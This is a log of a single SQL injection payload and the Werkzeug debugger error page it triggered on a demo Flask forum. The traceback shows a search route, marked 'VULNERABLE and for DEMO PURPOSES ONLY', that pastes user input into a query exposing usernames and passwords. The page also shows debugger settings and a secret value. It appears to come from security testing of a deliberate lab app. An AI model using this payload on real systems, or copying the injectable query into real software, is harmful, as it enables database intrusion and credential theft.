Payload: ' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT 'break'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
Response: <!doctype html>
<html lang=en>
  <head>
    <title>sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: information_schema.tables
[SQL: SELECT id, title, content, user_id, &#39;post&#39; as type FROM post WHERE title LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; OR content LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; UNION SELECT id, username, password, NULL, &#39;user&#39; as type FROM user WHERE username LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; OR password LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39;]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "XTUgh9DzmkWOWnw5BUfs";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>OperationalError</h1>
<div class="detail">
  <p class="errormsg">sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: information_schema.tables
[SQL: SELECT id, title, content, user_id, &#39;post&#39; as type FROM post WHERE title LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; OR content LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; UNION SELECT id, username, password, NULL, &#39;user&#39; as type FROM user WHERE username LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; OR password LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39;]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-2447161458896">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py"</cite>,
      line <em class="line">1964</em>,
      in <code class="function">_exec_single_context</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                            </span>context,</pre>
<pre class="line before"><span class="ws">                        </span>):</pre>
<pre class="line before"><span class="ws">                            </span>evt_handled = True</pre>
<pre class="line before"><span class="ws">                            </span>break</pre>
<pre class="line before"><span class="ws">                </span>if not evt_handled:</pre>
<pre class="line current"><span class="ws">                    </span>self.dialect.do_execute(
<span class="ws">                    </span>^</pre>
<pre class="line after"><span class="ws">                        </span>cursor, str_statement, effective_parameters, context</pre>
<pre class="line after"><span class="ws">                    </span>)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">            </span>if self._has_events or self.engine._has_events:</pre>
<pre class="line after"><span class="ws">                </span>self.dispatch.after_cursor_execute(</pre></div>
</div>

<li><div class="frame" id="frame-2447161459040">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\default.py"</cite>,
      line <em class="line">945</em>,
      in <code class="function">do_execute</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def do_executemany(self, cursor, statement, parameters, context=None):</pre>
<pre class="line before"><span class="ws">        </span>cursor.executemany(statement, parameters)</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def do_execute(self, cursor, statement, parameters, context=None):</pre>
<pre class="line current"><span class="ws">        </span>cursor.execute(statement, parameters)
<span class="ws">        </span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def do_execute_no_params(self, cursor, statement, context=None):</pre>
<pre class="line after"><span class="ws">        </span>cursor.execute(statement)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def is_disconnect(</pre></div>
</div>

<li><div class="exc-divider">The above exception was the direct cause of the following exception:</div>
<li><div class="frame" id="frame-2447142135424">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1536</em>,
      in <code class="function">__call__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>) -&gt; cabc.Iterable[bytes]:</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)
<span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre></div>
</div>

<li><div class="frame" id="frame-2447142134848">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1514</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)
<span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-2447142135280">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1511</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()
<span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-2447142135568">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">919</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)
<span class="ws">            </span>     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
</div>

<li><div class="frame" id="frame-2447142135712">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">917</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()
<span class="ws">                </span>     ^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-2447142135856">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">902</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
<span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-2447142136000">
  <h4>File <cite class="filename">"F:\project\forum\app.py"</cite>,
      line <em class="line">422</em>,
      in <code class="function">search</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span>@app.route(&#39;/search&#39;, methods=[&#39;GET&#39;])</pre>
<pre class="line before"><span class="ws"></span>def search():</pre>
<pre class="line before"><span class="ws">    </span>query = request.args.get(&#39;q&#39;, &#39;&#39;)</pre>
<pre class="line before"><span class="ws">    </span># WARNING: This is VULNERABLE and for DEMO PURPOSES ONLY</pre>
<pre class="line current"><span class="ws">    </span>results = db.session.execute(text(f&#34;SELECT id, title, content, user_id, &#39;post&#39; as type FROM post WHERE title LIKE &#39;%{query}%&#39; OR content LIKE &#39;%{query}%&#39; UNION SELECT id, username, password, NULL, &#39;user&#39; as type FROM user WHERE username LIKE &#39;%{query}%&#39; OR password LIKE &#39;%{query}%&#39;&#34;)).fetchall()
<span class="ws">    </span>          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span># Process the results into a list of dictionaries</pre>
<pre class="line after"><span class="ws">    </span>processed_results = []</pre>
<pre class="line after"><span class="ws">    </span>for row in results:</pre>
<pre class="line after"><span class="ws">        </span>if row[4] == &#39;post&#39;:</pre></div>
</div>

<li><div class="frame" id="frame-2447142139312">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\orm\scoping.py"</cite>,
      line <em class="line">779</em>,
      in <code class="function">execute</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;  # noqa: E501</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line current"><span class="ws">        </span>return self._proxied.execute(
<span class="ws">        </span>       </pre>
<pre class="line after"><span class="ws">            </span>statement,</pre>
<pre class="line after"><span class="ws">            </span>params=params,</pre>
<pre class="line after"><span class="ws">            </span>execution_options=execution_options,</pre>
<pre class="line after"><span class="ws">            </span>bind_arguments=bind_arguments,</pre>
<pre class="line after"><span class="ws">            </span>_parent_execute_state=_parent_execute_state,</pre></div>
</div>

<li><div class="frame" id="frame-2447142139600">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\orm\session.py"</cite>,
      line <em class="line">2365</em>,
      in <code class="function">execute</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>:return: a :class:`_engine.Result` object.</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line current"><span class="ws">        </span>return self._execute_internal(
<span class="ws">        </span>       </pre>
<pre class="line after"><span class="ws">            </span>statement,</pre>
<pre class="line after"><span class="ws">            </span>params,</pre>
<pre class="line after"><span class="ws">            </span>execution_options=execution_options,</pre>
<pre class="line after"><span class="ws">            </span>bind_arguments=bind_arguments,</pre>
<pre class="line after"><span class="ws">            </span>_parent_execute_state=_parent_execute_state,</pre></div>
</div>

<li><div class="frame" id="frame-2447142139744">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\orm\session.py"</cite>,
      line <em class="line">2260</em>,
      in <code class="function">_execute_internal</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                </span>execution_options,</pre>
<pre class="line before"><span class="ws">                </span>bind_arguments,</pre>
<pre class="line before"><span class="ws">                </span>conn,</pre>
<pre class="line before"><span class="ws">            </span>)</pre>
<pre class="line before"><span class="ws">        </span>else:</pre>
<pre class="line current"><span class="ws">            </span>result = conn.execute(
<span class="ws">            </span>         </pre>
<pre class="line after"><span class="ws">                </span>statement, params or {}, execution_options=execution_options</pre>
<pre class="line after"><span class="ws">            </span>)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span>if _scalar_result:</pre>
<pre class="line after"><span class="ws">            </span>return result.scalar()</pre></div>
</div>

<li><div class="frame" id="frame-2447142139888">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py"</cite>,
      line <em class="line">1416</em>,
      in <code class="function">execute</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>meth = statement._execute_on_connection</pre>
<pre class="line before"><span class="ws">        </span>except AttributeError as err:</pre>
<pre class="line before"><span class="ws">            </span>raise exc.ObjectNotExecutableError(statement) from err</pre>
<pre class="line before"><span class="ws">        </span>else:</pre>
<pre class="line current"><span class="ws">            </span>return meth(
<span class="ws">            </span>       </pre>
<pre class="line after"><span class="ws">                </span>self,</pre>
<pre class="line after"><span class="ws">                </span>distilled_parameters,</pre>
<pre class="line after"><span class="ws">                </span>execution_options or NO_OPTIONS,</pre>
<pre class="line after"><span class="ws">            </span>)</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-2447142140032">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\sql\elements.py"</cite>,
      line <em class="line">523</em>,
      in <code class="function">_execute_on_connection</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>execution_options: CoreExecuteOptionsParameter,</pre>
<pre class="line before"><span class="ws">    </span>) -&gt; Result[Any]:</pre>
<pre class="line before"><span class="ws">        </span>if self.supports_execution:</pre>
<pre class="line before"><span class="ws">            </span>if TYPE_CHECKING:</pre>
<pre class="line before"><span class="ws">                </span>assert isinstance(self, Executable)</pre>
<pre class="line current"><span class="ws">            </span>return connection._execute_clauseelement(
<span class="ws">            </span>       </pre>
<pre class="line after"><span class="ws">                </span>self, distilled_params, execution_options</pre>
<pre class="line after"><span class="ws">            </span>)</pre>
<pre class="line after"><span class="ws">        </span>else:</pre>
<pre class="line after"><span class="ws">            </span>raise exc.ObjectNotExecutableError(self)</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-2447142141184">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py"</cite>,
      line <em class="line">1638</em>,
      in <code class="function">_execute_clauseelement</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>column_keys=keys,</pre>
<pre class="line before"><span class="ws">            </span>for_executemany=for_executemany,</pre>
<pre class="line before"><span class="ws">            </span>schema_translate_map=schema_translate_map,</pre>
<pre class="line before"><span class="ws">            </span>linting=self.dialect.compiler_linting | compiler.WARN_LINTING,</pre>
<pre class="line before"><span class="ws">        </span>)</pre>
<pre class="line current"><span class="ws">        </span>ret = self._execute_context(
<span class="ws">        </span>      </pre>
<pre class="line after"><span class="ws">            </span>dialect,</pre>
<pre class="line after"><span class="ws">            </span>dialect.execution_ctx_cls._init_compiled,</pre>
<pre class="line after"><span class="ws">            </span>compiled_sql,</pre>
<pre class="line after"><span class="ws">            </span>distilled_parameters,</pre>
<pre class="line after"><span class="ws">            </span>execution_options,</pre></div>
</div>

<li><div class="frame" id="frame-2447142141328">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py"</cite>,
      line <em class="line">1843</em>,
      in <code class="function">_execute_context</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>context.pre_exec()</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>if context.execute_style is ExecuteStyle.INSERTMANYVALUES:</pre>
<pre class="line before"><span class="ws">            </span>return self._exec_insertmany_context(dialect, context)</pre>
<pre class="line before"><span class="ws">        </span>else:</pre>
<pre class="line current"><span class="ws">            </span>return self._exec_single_context(
<span class="ws">            </span>       </pre>
<pre class="line after"><span class="ws">                </span>dialect, context, statement, parameters</pre>
<pre class="line after"><span class="ws">            </span>)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def _exec_single_context(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre></div>
</div>

<li><div class="frame" id="frame-2447142141472">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py"</cite>,
      line <em class="line">1983</em>,
      in <code class="function">_exec_single_context</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>context.post_exec()</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">            </span>result = context._setup_result_proxy()</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>except BaseException as e:</pre>
<pre class="line current"><span class="ws">            </span>self._handle_dbapi_exception(
<span class="ws">            </span>^</pre>
<pre class="line after"><span class="ws">                </span>e, str_statement, effective_parameters, cursor, context</pre>
<pre class="line after"><span class="ws">            </span>)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span>return result</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-2447142141616">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py"</cite>,
      line <em class="line">2352</em>,
      in <code class="function">_handle_dbapi_exception</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">            </span>if newraise:</pre>
<pre class="line before"><span class="ws">                </span>raise newraise.with_traceback(exc_info[2]) from e</pre>
<pre class="line before"><span class="ws">            </span>elif should_wrap:</pre>
<pre class="line before"><span class="ws">                </span>assert sqlalchemy_exception is not None</pre>
<pre class="line current"><span class="ws">                </span>raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
<span class="ws">                </span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>else:</pre>
<pre class="line after"><span class="ws">                </span>assert exc_info[1] is not None</pre>
<pre class="line after"><span class="ws">                </span>raise exc_info[1].with_traceback(exc_info[2])</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre>
<pre class="line after"><span class="ws">            </span>del self._reentrant_error</pre></div>
</div>

<li><div class="frame" id="frame-2447142141760">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py"</cite>,
      line <em class="line">1964</em>,
      in <code class="function">_exec_single_context</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                            </span>context,</pre>
<pre class="line before"><span class="ws">                        </span>):</pre>
<pre class="line before"><span class="ws">                            </span>evt_handled = True</pre>
<pre class="line before"><span class="ws">                            </span>break</pre>
<pre class="line before"><span class="ws">                </span>if not evt_handled:</pre>
<pre class="line current"><span class="ws">                    </span>self.dialect.do_execute(
<span class="ws">                    </span>^</pre>
<pre class="line after"><span class="ws">                        </span>cursor, str_statement, effective_parameters, context</pre>
<pre class="line after"><span class="ws">                    </span>)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">            </span>if self._has_events or self.engine._has_events:</pre>
<pre class="line after"><span class="ws">                </span>self.dispatch.after_cursor_execute(</pre></div>
</div>

<li><div class="frame" id="frame-2447161458752">
  <h4>File <cite class="filename">"F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\default.py"</cite>,
      line <em class="line">945</em>,
      in <code class="function">do_execute</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def do_executemany(self, cursor, statement, parameters, context=None):</pre>
<pre class="line before"><span class="ws">        </span>cursor.executemany(statement, parameters)</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def do_execute(self, cursor, statement, parameters, context=None):</pre>
<pre class="line current"><span class="ws">        </span>cursor.execute(statement, parameters)
<span class="ws">        </span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def do_execute_no_params(self, cursor, statement, context=None):</pre>
<pre class="line after"><span class="ws">        </span>cursor.execute(statement)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def is_disconnect(</pre></div>
</div>
</ul>
  <blockquote>sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: information_schema.tables
[SQL: SELECT id, title, content, user_id, &#39;post&#39; as type FROM post WHERE title LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; OR content LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; UNION SELECT id, username, password, NULL, &#39;user&#39; as type FROM user WHERE username LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39; OR password LIKE &#39;%&#39; AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT &#39;break&#39;),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --%&#39;]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py&#34;, line 1964, in _exec_single_context
    self.dialect.do_execute(
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\default.py&#34;, line 945, in do_execute
    cursor.execute(statement, parameters)
sqlite3.OperationalError: no such table: information_schema.tables

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File &#34;F:\project\forum\myenv\Lib\site-packages\flask\app.py&#34;, line 1536, in __call__
    return self.wsgi_app(environ, start_response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\flask\app.py&#34;, line 1514, in wsgi_app
    response = self.handle_exception(e)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\flask\app.py&#34;, line 1511, in wsgi_app
    response = self.full_dispatch_request()
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\flask\app.py&#34;, line 919, in full_dispatch_request
    rv = self.handle_user_exception(e)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\flask\app.py&#34;, line 917, in full_dispatch_request
    rv = self.dispatch_request()
         ^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\flask\app.py&#34;, line 902, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;F:\project\forum\app.py&#34;, line 422, in search
    results = db.session.execute(text(f&#34;SELECT id, title, content, user_id, &#39;post&#39; as type FROM post WHERE title LIKE &#39;%{query}%&#39; OR content LIKE &#39;%{query}%&#39; UNION SELECT id, username, password, NULL, &#39;user&#39; as type FROM user WHERE username LIKE &#39;%{query}%&#39; OR password LIKE &#39;%{query}%&#39;&#34;)).fetchall()
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\orm\scoping.py&#34;, line 779, in execute
    return self._proxied.execute(
           ^^^^^^^^^^^^^^^^^^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\orm\session.py&#34;, line 2365, in execute
    return self._execute_internal(
           ^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\orm\session.py&#34;, line 2260, in _execute_internal
    result = conn.execute(
             ^^^^^^^^^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py&#34;, line 1416, in execute
    return meth(
           ^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\sql\elements.py&#34;, line 523, in _execute_on_connection
    return connection._execute_clauseelement(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py&#34;, line 1638, in _execute_clauseelement
    ret = self._execute_context(
          ^^^^^^^^^^^^^^^^^^^^^^
  File &#34;F:\project\forum\myenv\Lib\site-packages\sqlalchemy\engine\base.py&#34;, line 1843, in _execute_context
    return self._exec_single_context(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
